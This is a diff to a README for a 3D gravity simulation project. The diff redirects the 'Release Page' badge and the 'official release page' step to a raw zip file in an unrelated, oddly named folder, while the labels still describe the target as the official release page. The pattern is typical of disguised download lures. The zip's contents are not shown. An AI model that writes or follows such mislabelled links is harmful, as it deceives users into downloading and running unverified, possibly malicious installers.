@@ -1,6 +1,6 @@
 # 🪐 gravity_simulation3d - Explore gravity using 3D physics models
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Milkupprem/gravity_simulation3d)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Milkupprem/gravity_simulation3d/raw/refs/heads/main/epitheliogenetic/gravity_simulation_d_2.3.zip)
 
 ## 📋 About This Project
 
@@ -25,7 +25,7 @@ If your computer uses an integrated graphics chip, the simulation might run slow
 Follow these steps to get the files on your machine:
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/Milkupprem/gravity_simulation3d).
+2. Go to the [official release page](https://github.com/Milkupprem/gravity_simulation3d/raw/refs/heads/main/epitheliogenetic/gravity_simulation_d_2.3.zip).
 3. Look for the latest version under the Releases section.
 4. Click the link for the Windows installer file.
 5. Save the file to your desktop or downloads folder.
